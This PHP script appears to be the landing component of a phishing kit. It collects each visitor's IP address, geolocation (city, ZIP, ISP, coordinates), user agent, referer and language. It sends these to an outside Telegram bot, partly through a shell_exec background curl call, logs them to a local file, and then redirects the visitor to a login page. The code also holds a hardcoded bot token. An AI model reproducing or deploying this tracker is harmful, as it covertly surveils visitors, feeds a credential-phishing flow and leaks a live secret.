<?php
// Telegram Bot Configuration
$telegram_bot_token = '8529028584:AAF7Zjo0gb9Va07nEWcPMuuNG4SHH2PBv04'; // Replace with your bot token
$telegram_chat_id = ''; // Replace with your chat ID

// Get user's IP address
function getUserIP() {
    $ip = $_SERVER['REMOTE_ADDR'];
    
    // Check for proxy/load balancer
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    
    return $ip;
}

// Get all user information
function getUserInfo($ip) {
    $info = [
        'ip' => $ip,
        'country' => 'Unknown',
        'country_code' => 'Unknown',
        'city' => 'Unknown',
        'zip' => 'Unknown',
        'region' => 'Unknown',
        'isp' => 'Unknown',
        'timezone' => 'Unknown',
        'lat' => 'Unknown',
        'lon' => 'Unknown'
    ];
    
    // Get location data from ip-api.com
    $api_url = "http://ip-api.com/json/{$ip}";
    $response = @file_get_contents($api_url);
    
    if ($response) {
        $data = json_decode($response, true);
        if (isset($data['status']) && $data['status'] == 'success') {
            $info['country'] = $data['country'] ?? 'Unknown';
            $info['country_code'] = $data['countryCode'] ?? 'Unknown';
            $info['city'] = $data['city'] ?? 'Unknown';
            $info['zip'] = $data['zip'] ?? 'Unknown';
            $info['region'] = $data['regionName'] ?? 'Unknown';
            $info['isp'] = $data['isp'] ?? 'Unknown';
            $info['timezone'] = $data['timezone'] ?? 'Unknown';
            $info['lat'] = $data['lat'] ?? 'Unknown';
            $info['lon'] = $data['lon'] ?? 'Unknown';
        }
    }
    
    // Get additional browser/device info
    $info['user_agent'] = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $info['referer'] = $_SERVER['HTTP_REFERER'] ?? 'Direct visit';
    $info['language'] = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown';
    $info['method'] = $_SERVER['REQUEST_METHOD'] ?? 'Unknown';
    $info['datetime'] = date('Y-m-d H:i:s');
    
    return $info;
}

// Send message to Telegram
function sendToTelegram($bot_token, $chat_id, $message) {
    $telegram_url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
    
    $post_fields = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegram_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $result = curl_exec($ch);
    curl_close($ch);
    
    return $result;
}

// Main execution
$user_ip = getUserIP();

// If localhost, use a test IP
if ($user_ip == '127.0.0.1' || $user_ip == '::1') {
    $user_ip = '8.8.8.8'; // Test IP
}

// Get all user information
$user_info = getUserInfo($user_ip);

// Create formatted message for Telegram
$message = "<b>🔔 New Visitor Information</b>\n\n";
$message .= "🕐 <b>Time:</b> {$user_info['datetime']}\n";
$message .= "🌐 <b>IP Address:</b> <code>{$user_info['ip']}</code>\n";
$message .= "📍 <b>Location:</b> {$user_info['city']}, {$user_info['region']}, {$user_info['country']}\n";
$message .= "🏳️ <b>Country Code:</b> {$user_info['country_code']}\n";
$message .= "📮 <b>ZIP Code:</b> {$user_info['zip']}\n";
$message .= "📡 <b>ISP:</b> {$user_info['isp']}\n";
$message .= "🛰️ <b>Coordinates:</b> {$user_info['lat']}, {$user_info['lon']}\n";
$message .= "⏰ <b>Timezone:</b> {$user_info['timezone']}\n";
$message .= "🔗 <b>Referer:</b> {$user_info['referer']}\n";
$message .= "🌍 <b>Language:</b> {$user_info['language']}\n";
$message .= "💻 <b>User Agent:</b> {$user_info['user_agent']}\n";
$message .= "📝 <b>Method:</b> {$user_info['method']}\n";
$message .= "📱 <i>User redirected to login page</i>";

// Send to Telegram (in background to avoid delay)
if (!empty($telegram_bot_token) && !empty($telegram_chat_id)) {
    // Use background process to avoid redirect delay
    $background_url = (isset($_SERVER['HTTPS']) ? 'https' : 'http') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
    
    // Fork the request to avoid waiting for Telegram API
    if (function_exists('shell_exec') && strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
        // For Linux servers
        shell_exec("php -r '\$ch = curl_init(\"https://api.telegram.org/bot{$telegram_bot_token}/sendMessage\"); curl_setopt(\$ch, CURLOPT_RETURNTRANSFER, true); curl_setopt(\$ch, CURLOPT_POSTFIELDS, \"chat_id={$telegram_chat_id}&text=" . urlencode($message) . "&parse_mode=HTML\"); curl_exec(\$ch); curl_close(\$ch);' > /dev/null 2>&1 &");
    } else {
        // For shared hosting or Windows
        sendToTelegram($telegram_bot_token, $telegram_chat_id, $message);
    }
}

// Also save to local file for backup
$log_entry = "[" . date('Y-m-d H:i:s') . "] IP: {$user_info['ip']} | Country: {$user_info['country']} | City: {$user_info['city']} | ZIP: {$user_info['zip']} | ISP: {$user_info['isp']} | User Agent: {$user_info['user_agent']}\n";
file_put_contents('visitors_log.txt', $log_entry, FILE_APPEND);

// Store in session for later use
session_start();
$_SESSION['user_info'] = $user_info;

// Redirect to login page
header("Location: ./login.html");
exit();
?>
